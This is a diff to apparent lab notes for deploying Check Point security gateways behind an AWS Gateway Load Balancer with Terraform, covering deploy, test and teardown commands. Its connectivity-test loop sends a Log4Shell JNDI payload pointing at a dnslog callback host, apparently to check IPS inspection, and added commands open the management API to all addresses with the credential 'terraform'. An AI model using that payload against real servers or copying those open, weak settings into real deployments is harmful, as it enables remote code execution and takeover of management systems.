@@ -29,6 +29,8 @@ tf apply -auto-approve -target module.cpman
 # Check Point Security Gateways with GWLB in Inspection VPC
 tf apply -auto-approve -target module.cgns
 
+tf apply -auto-approve -target module.routes
+
 # full deployment
 tf apply -auto-approve
 
@@ -43,14 +45,30 @@ autoprov_cfg set template -tn gwlb-configuration -ia -ips
 
 watch -d api status
 
+mgmt_cli -r true set api-settings accepted-api-calls-from 'All IP addresses' --domain 'System Data'; api restart
+
+# create api user
+mgmt_cli -r true add api-user name "terraform" password "terraform" --domain "System Data"
+
+# add api-key
+
+mgmt_cli -r true add api-key name "terraform" key "terraform" --domain "System Data"
+
 tail -f /var/log/CPcme/cme.log
 
 # mgmt ip 10.255.77.227
 # cplic - required for IPS!
 
 #connectivity test from spoke hosts
-while true; do curl -s -m1 ip.iol.cz/ip/; echo; ping -c1 1.1.1.1; sleep 3; curl -s -m2 ip.iol.cz/ip/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}';  done
+while true; do curl 10.11.10.11 -m1; curl 10.10.10.10 -m1; curl -s -m1 ip.iol.cz/ip/; echo; ping -c1 1.1.1.1; sleep 3; curl -s -m2 ip.iol.cz/ip/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}';  done
 
+
+# remove
+tf destroy -auto-approve -target module.routes
+tf destroy -auto-approve -target module.cgns
+tf destroy -auto-approve -target module.cpman
+tf destroy -auto-approve -target module.instances
+tf destroy -auto-approve -target module.env
 
 ```
 
